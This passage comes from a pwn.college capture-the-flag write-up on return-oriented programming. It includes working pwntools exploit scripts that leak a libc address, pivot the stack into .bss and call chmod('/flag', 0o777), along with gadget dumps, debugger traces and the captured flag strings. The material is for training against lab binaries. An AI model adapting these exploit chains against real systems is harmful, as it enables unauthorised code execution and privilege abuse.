                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"DDDDDDDD"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════   

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x4150f0
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"DDDDDDDD"

Function call setup:
chmod("/flag")

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════   

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x4150f0
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"DDDDDDDD"

Function call setup:
chmod("/flag")

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════   

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x4150f0
rsi: 0x1ff
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"DDDDDDDD"

Function call setup:
chmod("/flag", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
          rsp --> 0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x4150f0
rsi: 0x1ff
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"EEEEEEEE"

Function call setup:
chmod("/flag", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

BSS:
                           ┌───────────────────────────┐
                           │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x4150f0
rsi: 0x1ff
r13: b"/flag\x00\x00\x00"
r14: b"CCCCCCCC"
r15: b"EEEEEEEE"

Function call setup:
chmod("/flag", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> chmod("/flag", 0o777)
═══════════════════════════════════════════════════════════════════════════════════
```

A call to `chmod("/flag", 0o777)` would be made which would allow us to read from the `/flag` file.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x4023f3
pop_rsi_pop_r15 = 0x4023f1
pop_rsp_pop_r13_pop_r14_pop_r15 = 0x4023ed
# PLT entries
puts_plt = 0x401120
# GOT entries
puts_got = 0x405028
# Memory addresses and offsets
_start_func_addr = 0x4011d0
bss_rop_chain_addr = 0x4150e0 + 16
offset = 0

p = process('/challenge/pivotal-prelude-easy')

# --- STAGE 1: Leak address of `puts` within Libc ---
log.info("Sending Stage 1: puts(puts@got)")
payload1 = flat(
    b"A" * offset,

    # Stack pivot to the rest of the ROP chain in .bss
    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, b"B" * 8, b"C" * 8, b"D" * 8,

    # puts(puts@got)
    pop_rdi, puts_got,
    puts_plt,

    # Call _start()
    _start_func_addr
)

# Send payload
p.send(payload1)

# Parse the leak
p.recvuntil(b"Leaving!\n")
leak = p.recv(6)
puts_libc = u64(leak.ljust(8, b"\x00"))

# Calculate the address of the Libc entry of chmod
libc_base = puts_libc - 0x84420
chmod_libc = libc_base + 0x10dd80

print(f"\n[+] puts@libc: {hex(puts_libc)}")
print(f"[+] libc_base: {hex(libc_base)}")
print(f"[+] chmod@libc: {hex(chmod_libc)}\n")

# --- STAGE 2: repeat test ---
# This ensures the "Welcome" message is out of the way 
# and the program is actually at the 'read' call for Stage 2.
p.recvuntil(b"execute your full ropchain!")

flag_str = b"/flag\x00\x00\x00"

log.info("Sending Stage 2: chmod('!', 0o777)")
payload2 = flat(
    b"A" * offset,

    # Stack pivot to the rest of the ROP chain in .bss
    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, flag_str, b"C" * 8, b"D" * 8,

    # chmod("/flag", 0o777)
    pop_rdi, bss_rop_chain_addr,      
    pop_rsi_pop_r15, 0o777, b"E" * 8, 
    chmod_libc
)

p.send(payload2)

p.interactive()
```

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ python ~/script.py
[+] Starting local process '/challenge/pivotal-prelude-easy': pid 36587
[*] Sending Stage 1: puts(puts@got)

[+] puts@libc: 0x7f4fa40f8420
[+] libc_base: 0x7f4fa4074000
[+] chmod@libc: 0x7f4fa4181d80

[*] Sending Stage 2: chmod('!', 0o777)
[*] Switching to interactive mode

[*] Process '/challenge/pivotal-prelude-easy' stopped with exit code -11 (SIGSEGV) (pid 36587)
Received 88 bytes! This is potentially 11 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 11 gadgets of ROP chain at 0x4150e0.
| 0x00000000004023ed: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ; 
| 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
| 0x00000067616c662f: (UNMAPPED MEMORY)
| 0x4343434343434343: (UNMAPPED MEMORY)
| 0x4444444444444444: (UNMAPPED MEMORY)
| 0x00000000004023f3: pop rdi ; ret  ; 
| 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
| 0x00000000004023f1: pop rsi ; pop r15 ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x4545454545454545: (UNMAPPED MEMORY)
| 0x00007f4fa4181d80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x7f4fa4181d94 ; ret  ; 

Of course, only 24 bytes of the above ropchain was copied to the stack!
Let's take a look at just that part of the chain. To execute the rest, you'll have to pivot the stack!

+--- Printing 3 gadgets of ROP chain at 0x415018.
| 0x00000000004023ed: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ; 
| 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
| 0x00000067616c662f: (UNMAPPED MEMORY)

Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~pivotal-prelude-easy:/$ cat /flag 
pwn.college{AshqlZDnJJarLIWj_35ueVUW8RT.01N1MDL4ITM0EzW}
```

&nbsp;

## Pivotal Prelude (Hard)

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ /challenge/pivotal-prelude-hard 
###
### Welcome to /challenge/pivotal-prelude-hard!
###

```

This challenge is similar to the previous one, where we have a limited room on the stack and have to perform a pivot.

Requirements in order to craft an exploit:

- [ ] Location of the PLT entry of `puts@plt`
- [ ] Location of the GOT entry of `puts@got`
- [ ] Location of the ROP chain within BSS
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

### Binary Analysis

#### `puts@plt` (Procedure Linkage Table entry)

Let's find the location of the `puts@plt` stub.

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ objdump -d /challenge/pivotal-prelude-hard | grep "<puts@plt>:"
00000000004010a0 <puts@plt>:
```

- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
- [ ] Location of the GOT entry of `puts@got`
- [ ] Location of the ROP chain within BSS
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `puts@got` (Global Offset Table entry)

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -r /challenge/pivotal-prelude-hard | grep "puts"
000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
```

- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
- [x] Location of the GOT entry of `puts@got`: `0x404020`
- [ ] Location of the ROP chain within BSS
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `_start()`

We need find this address so the we can can invoke the program again to execute our second stage of payload.

```
pwndbg> info address _start 
Symbol "_start" is at 0x4010f0 in a file compiled without debugging.
```

- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
- [x] Location of the GOT entry of `puts@got`: `0x404020`
- [ ] Location of the ROP chain within BSS
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4010f0`

#### ROP gadgets

Now, we need to find the relevent ROP gadgets, and their addresses.

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ ROPgadget --binary /challenge/pivotal-prelude-hard
Gadgets information
============================================================
0x000000000040111d : add ah, dh ; nop ; endbr64 ; ret
0x000000000040114b : add bh, bh ; loopne 0x4011b5 ; nop ; ret
0x000000000040141c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004013a0 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004013a1 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004011ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040141e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040111c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004013a2 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004011bb : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011b9 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040111b : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004013a3 : add cl, cl ; ret
0x000000000040114a : add dil, dil ; loopne 0x4011b5 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004011bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011b7 : add eax, 0x2ebb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004012ea : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004011d3 : cli ; jmp 0x401160
0x0000000000401123 : cli ; ret
0x000000000040142b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011d0 : endbr64 ; jmp 0x401160
0x0000000000401120 : endbr64 ; ret
0x00000000004013fc : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040111e : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401145 : je 0x401150 ; mov edi, 0x404058 ; jmp rax
0x0000000000401187 : je 0x401190 ; mov edi, 0x404058 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011d4 : jmp 0x401160
0x000000000040100b : jmp 0x4840103f
0x000000000040114c : jmp rax
0x00000000004012ec : leave ; ret
0x000000000040114d : loopne 0x4011b5 ; nop ; ret
0x00000000004011b6 : mov byte ptr [rip + 0x2ebb], 1 ; pop rbp ; ret
0x000000000040139f : mov eax, 0 ; leave ; ret
0x00000000004011b8 : mov ebx, 0x100002e ; pop rbp ; ret
0x0000000000401147 : mov edi, 0x404058 ; jmp rax
0x000000000040111f : nop ; endbr64 ; ret
0x00000000004012eb : nop ; leave ; ret
0x0000000000401282 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401283 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401284 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401285 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401286 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401287 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401288 : nop ; nop ; pop rbp ; ret
0x0000000000401289 : nop ; pop rbp ; ret
0x000000000040114f : nop ; ret
0x00000000004011cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401160
0x0000000000401146 : or dword ptr [rdi + 0x404058], edi ; jmp rax
0x000000000040140c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040140e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401410 : pop r14 ; pop r15 ; ret
0x0000000000401412 : pop r15 ; ret
0x0000000000401148 : pop rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
0x000000000040140b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040140f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004011bd : pop rbp ; ret
0x0000000000401413 : pop rdi ; ret
0x0000000000401411 : pop rsi ; pop r15 ; ret
0x000000000040140d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040142d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040142c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401143 : test eax, eax ; je 0x401150 ; mov edi, 0x404058 ; jmp rax
0x0000000000401185 : test eax, eax ; je 0x401190 ; mov edi, 0x404058 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 78
```

- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
- [x] Location of the GOT entry of `puts@got`: `0x404020`
- [ ] Location of the ROP chain within BSS
- [ ] Offsets of required Libc functions
- [x] Locations of required ROP gadgets:
   - `pop rdi ; ret`: `0x401413`
   - `pop rsi ; pop r15 ; ret`: `0x401411`
   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
- [x] Address of `_start()`: `0x4010f0`

#### Libc functions

Now, lets find the offset of `puts` and `chmod` within Libc. This will be useful in the second stage of our exploit.

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
```

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
```

- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
- [x] Location of the GOT entry of `puts@got`: `0x404020`
- [ ] Location of the ROP chain within BSS
- [x] Offsets of required Libc functions:
   - Offset of the `puts` symbol within Libc: `0x84420`
   - Offset of the `chmod` symbol within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets:
   - `pop rdi ; ret`: `0x401413`
   - `pop rsi ; pop r15 ; ret`: `0x401411`
   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
- [x] Address of `_start()`: `0x4010f0`

#### `challenge()`

Finally, let's find the location in the BSS where our ROP payload is initially stored.

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040128c <+0>:     endbr64
   0x0000000000401290 <+4>:     push   rbp
   0x0000000000401291 <+5>:     mov    rbp,rsp
   0x0000000000401294 <+8>:     sub    rsp,0x40
   0x0000000000401298 <+12>:    mov    DWORD PTR [rbp-0x24],edi
   0x000000000040129b <+15>:    mov    QWORD PTR [rbp-0x30],rsi
   0x000000000040129f <+19>:    mov    QWORD PTR [rbp-0x38],rdx
   0x00000000004012a3 <+23>:    mov    edx,0x1000
   0x00000000004012a8 <+28>:    lea    rsi,[rip+0x12dd1]        # 0x414080 <data+65536>
   0x00000000004012af <+35>:    mov    edi,0x0
   0x00000000004012b4 <+40>:    call   0x4010c0 <read@plt>
   0x00000000004012b9 <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004012bc <+48>:    mov    rax,rbp
   0x00000000004012bf <+51>:    mov    QWORD PTR [rbp-0x10],rax
   0x00000000004012c3 <+55>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004012c7 <+59>:    add    rax,0x8
   0x00000000004012cb <+63>:    mov    edx,0x18
   0x00000000004012d0 <+68>:    lea    rsi,[rip+0x12da9]        # 0x414080 <data+65536>
   0x00000000004012d7 <+75>:    mov    rdi,rax
   0x00000000004012da <+78>:    call   0x4010d0 <memcpy@plt>
   0x00000000004012df <+83>:    lea    rdi,[rip+0xd1e]        # 0x402004
   0x00000000004012e6 <+90>:    call   0x4010a0 <puts@plt>
   0x00000000004012eb <+95>:    nop
   0x00000000004012ec <+96>:    leave
   0x00000000004012ed <+97>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+78` where the ROP payload is being copied from a source in the BSS to a destination in the stack.

```
pwndbg> break *(challenge+78)
Breakpoint 1 at 0x4012da
```

Let's run.

```
pwndbg> run
Starting program: /challenge/pivotal-prelude-hard 
###
### Welcome to /challenge/pivotal-prelude-hard!
###

aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb

Breakpoint 1, 0x00000000004012da in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
 RBX  0x4013b0 (__libc_csu_init) ◂— endbr64 
 RCX  0x72b1dfc361f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x18
 RDI  0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
 RSI  0x414080 (data+65536) ◂— 'aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb\n'
 R8   0
 R9   0x30
 R10  0x72b1dfd4a3c0 (strcmp+3520) ◂— pxor xmm0, xmm0
 R11  0x246
 R12  0x4010f0 (_start) ◂— endbr64 
 R13  0x7ffe8c19d740 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe8c19d620 —▸ 0x7ffe8c19d650 ◂— 0
 RSP  0x7ffe8c19d5e0 —▸ 0x72b1dfd114a0 (_IO_file_jumps) ◂— 0
 RIP  0x4012da (challenge+78) ◂— call memcpy@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x4012da <challenge+78>    call   memcpy@plt                  <memcpy@plt>
        dest: 0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
        src: 0x414080 (data+65536) ◂— 'aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb\n'
        n: 0x18
 
   0x4012df <challenge+83>    lea    rdi, [rip + 0xd1e]     RDI => 0x402004 ◂— 'Leaving!'
   0x4012e6 <challenge+90>    call   puts@plt                    <puts@plt>
 
   0x4012eb <challenge+95>    nop    
   0x4012ec <challenge+96>    leave  
   0x4012ed <challenge+97>    ret    
 
   0x4012ee <main>            endbr64 
   0x4012f2 <main+4>          push   rbp
   0x4012f3 <main+5>          mov    rbp, rsp
   0x4012f6 <main+8>          sub    rsp, 0x20
   0x4012fa <main+12>         mov    dword ptr [rbp - 4], edi
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe8c19d5e0 —▸ 0x72b1dfd114a0 (_IO_file_jumps) ◂— 0
01:0008│-038 0x7ffe8c19d5e8 —▸ 0x7ffe8c19d758 —▸ 0x7ffe8c19f689 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-030 0x7ffe8c19d5f0 —▸ 0x7ffe8c19d748 —▸ 0x7ffe8c19f669 ◂— '/challenge/pivotal-prelude-hard'
03:0018│-028 0x7ffe8c19d5f8 ◂— 0x1dfbacde5
04:0020│-020 0x7ffe8c19d600 —▸ 0x4013b0 (__libc_csu_init) ◂— endbr64 
05:0028│-018 0x7ffe8c19d608 —▸ 0x7ffe8c19d650 ◂— 0
06:0030│-010 0x7ffe8c19d610 —▸ 0x7ffe8c19d620 —▸ 0x7ffe8c19d650 ◂— 0
07:0038│-008 0x7ffe8c19d618 ◂— 0x238c19d740
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4012da challenge+78
   1         0x401393 main+165
   2   0x72b1dfb4c083 __libc_start_main+243
   3         0x40111e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can see the location in the BSS within the `dest` parameter and also in the `rsi` register.

- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
- [x] Location of the GOT entry of `puts@got`: `0x404020`
- [x] Location of the ROP chain within BSS: `0x414080 + 16` (Because we do not want to execute the first two gadgets again in the BSS.)
- [x] Offsets of required Libc functions:
   - Offset of the `puts` symbol within Libc: `0x84420`
   - Offset of the `chmod` symbol within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets:
   - `pop rdi ; ret`: `0x401413`
   - `pop rsi ; pop r15 ; ret`: `0x401411`
   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
- [x] Address of `_start()`: `0x4010f0`

### ROP chain: Stack pivot + ret2libc

The ROP chain would be the exact same as the one in the [easy level](#rop-chain-stack-pivot--ret2libc).

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x401413
pop_rsi_pop_r15 = 0x401411
pop_rsp_pop_r13_pop_r14_pop_r15 = 0x40140d
# PLT entries
puts_plt = 0x4010a0
# GOT entries
puts_got = 0x404020
# Memory addresses and offsets
_start_func_addr = 0x4010f0
bss_rop_chain_addr = 0x414080 + 16
offset = 0

p = process('/challenge/pivotal-prelude-hard')

# --- STAGE 1: Leak address of `puts` within Libc ---
log.info("Sending Stage 1: puts(puts@got)")
payload1 = flat(
    b"A" * offset,

    # Stack pivot to the rest of the ROP chain in .bss
    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, b"B" * 8, b"C" * 8, b"D" * 8,

    # puts(puts@got)
    pop_rdi, puts_got,
    puts_plt,

    # Call _start()
    _start_func_addr
)

# Send payload
p.send(payload1)

# Parse the leak
p.recvuntil(b"Leaving!\n")
leak = p.recv(6)
puts_libc = u64(leak.ljust(8, b"\x00"))

# Calculate the address of the Libc entry of chmod
libc_base = puts_libc - 0x84420
chmod_libc = libc_base + 0x10dd80

print(f"\n[+] puts@libc: {hex(puts_libc)}")
print(f"[+] libc_base: {hex(libc_base)}")
print(f"[+] chmod@libc: {hex(chmod_libc)}\n")

# --- STAGE 2: repeat test ---
flag_str = b"/flag\x00\x00\x00"

log.info("Sending Stage 2: chmod('!', 0o777)")
payload2 = flat(
    b"A" * offset,

    # Stack pivot to the rest of the ROP chain in .bss
    pop_rsp_pop_r13_pop_r14_pop_r15, bss_rop_chain_addr, flag_str, b"C" * 8, b"D" * 8,

    # chmod("/flag", 0o777)
    pop_rdi, bss_rop_chain_addr,      
    pop_rsi_pop_r15, 0o777, b"E" * 8, 
    chmod_libc
)

p.send(payload2)

p.interactive()
```

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ python ~/script.py
[+] Starting local process '/challenge/pivotal-prelude-hard': pid 6058
[*] Sending Stage 1: puts(puts@got)

[+] puts@libc: 0x749b4c72b420
[+] libc_base: 0x749b4c6a7000
[+] chmod@libc: 0x749b4c7b4d80

[*] Sending Stage 2: chmod('!', 0o777)
[*] Switching to interactive mode

###
### Welcome to (null)!
###

[*] Process '/challenge/pivotal-prelude-hard' stopped with exit code -11 (SIGSEGV) (pid 6058)
Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~pivotal-prelude-hard:/$ cat /flag 
pwn.college{w0lkI9UBU_5iJK-DGm6-CGh-A4J.0FO1MDL4ITM0EzW}
```

&nbsp;

## Pivotal Pointer (Easy)

```
hacker@return-oriented-programming~pivotal-pointer-easy:/$ /challenge/pivotal-pointer-easy 
###
### Welcome to /challenge/pivotal-pointer-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
might take anywhere from 0-12 bits of bruteforce depending on the scenario.

In this challenge, a pointer to the win function is stored on the stack.
That pointer is stored at 0x7ffeee876be0, 8 bytes before your input buffer.
If you can pivot the stack to make the next gadget run be that win function, you will get the flag!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffeee876be8.

The win function has just been dynamically constructed at 0x7f9465ef8000.

```

Since location of the pointer to `win()` is before our buffer, we will have to perform a stack pivot so that our ROP chain executes the `win()` function.

We need the following:
- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

### Binary Analysis

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001d42 <+0>:     endbr64
   0x0000000000001d46 <+4>:     push   rbp
   0x0000000000001d47 <+5>:     mov    rbp,rsp
   0x0000000000001d4a <+8>:     sub    rsp,0x90
   0x0000000000001d51 <+15>:    mov    DWORD PTR [rbp-0x74],edi
   0x0000000000001d54 <+18>:    mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000001d58 <+22>:    mov    QWORD PTR [rbp-0x88],rdx
   0x0000000000001d5f <+29>:    lea    rdi,[rip+0x1432]        # 0x3198
